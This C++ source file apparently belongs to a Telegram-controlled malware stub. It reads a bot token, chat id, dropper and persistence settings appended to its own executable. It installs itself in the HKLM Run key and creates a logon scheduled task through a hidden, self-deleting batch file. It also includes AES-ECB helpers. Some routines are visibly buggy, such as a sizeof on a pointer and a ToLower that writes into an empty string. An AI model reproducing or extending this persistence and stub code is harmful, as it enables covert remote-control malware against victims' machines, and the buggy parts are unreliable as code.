/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Manager.h"
#include "Requests.h"

void Manager::ReadData(Settings* s) {
	char mePath[128] = { 0 };
	GetModuleFileNameA(NULL, mePath, sizeof(mePath) - 1);

	int filesize = GetFileSize(mePath) - sizeof(Settings);

	std::ifstream stub(mePath, std::ifstream::binary);
	stub.seekg(filesize);

	stub.read((char*)&s->botapi, sizeof(s->botapi));
	stub.read((char*)&s->key, sizeof(s->key));

	stub.read((char*)&s->chatid, sizeof(s->chatid));
	stub.read((char*)&s->drop, sizeof(s->drop));
	stub.read((char*)&s->drop_run, sizeof(bool));

	stub.read((char*)&s->scheduler_name, sizeof(s->scheduler_name));
	stub.read((char*)&s->scheduler_state, sizeof(bool));

	stub.read((char*)&s->client_delay, sizeof(s->client_delay));
	stub.read((char*)&s->autorun, sizeof(s->autorun));
	stub.read((char*)&s->autorun_state, sizeof(bool));

	stub.read((char*)&s->auto_delete, sizeof(bool));
	stub.read((char*)&s->protector, sizeof(bool));

	stub.close();
}

void Manager::Autorun(const char* path, const char* name) {
	HKEY reg_key = 0;
	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);

	result = RegSetValueEx(reg_key, path, 0, REG_SZ, (LPBYTE)path, sizeof(path) - 1);

	RegCloseKey(reg_key);
}

void Manager::Scheduler(const char* path, const char* name) {
	std::ofstream schd("scheduler.bat");
	schd << "@echo off \n";
	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
	schd.close();

	ShellExecuteA(0, "open", "scheduler.bat", 0, 0, SW_HIDE);
	Sleep(2000);
	DeleteFileA("scheduler.bat");
}

long Manager::GetFileSize(const char* filename) {
	struct stat stat_buf;
	int rc = stat(filename, &stat_buf);
	return rc == 0 ? stat_buf.st_size : -1;
}

bool Manager::FileExists(std::string name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

std::string Manager::EncryptStr(std::string text, std::string key) {
	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH], iv[CryptoPP::AES::BLOCKSIZE];
	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
	memset(iv, 0x00, CryptoPP::AES::BLOCKSIZE);

	std::string result = "";

	CryptoPP::AES::Encryption aesEncryption(bKey, CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::ECB_Mode_ExternalCipher::Encryption ebcEncryption(aesEncryption, iv);

	CryptoPP::StreamTransformationFilter stfEncryptor(ebcEncryption, new CryptoPP::StringSink(result));
	stfEncryptor.Put(reinterpret_cast<const unsigned char*>(text.c_str()), text.length() + 1);
	stfEncryptor.MessageEnd();

	return result;
}

std::string Manager::DecryptStr(std::string text, std::string key) {
	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH], iv[CryptoPP::AES::BLOCKSIZE];
	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
	memset(iv, 0x00, CryptoPP::AES::BLOCKSIZE);

	std::string result = "";

	CryptoPP::AES::Decryption aesDecryption(bKey, CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::ECB_Mode_ExternalCipher::Decryption ebcDecryption(aesDecryption, iv);

	CryptoPP::StreamTransformationFilter stfEncryptor(ebcDecryption, new CryptoPP::StringSink(result));
	stfEncryptor.Put(reinterpret_cast<const unsigned char*>(text.c_str()), text.length());
	stfEncryptor.MessageEnd();

	return result;
}

std::vector<std::string> Manager::split(std::string str, char delim) {
	std::stringstream ss(str);
	std::string word;
	std::vector<std::string> splittened;
	while (std::getline(ss, word, delim))
	{
		splittened.push_back(word);
	}
	return splittened;
}

std::string Manager::ToLower(std::string str) {
	std::string lower = "";
	std::transform(str.begin(), str.end(), lower.begin(), ::tolower);
	return lower;
}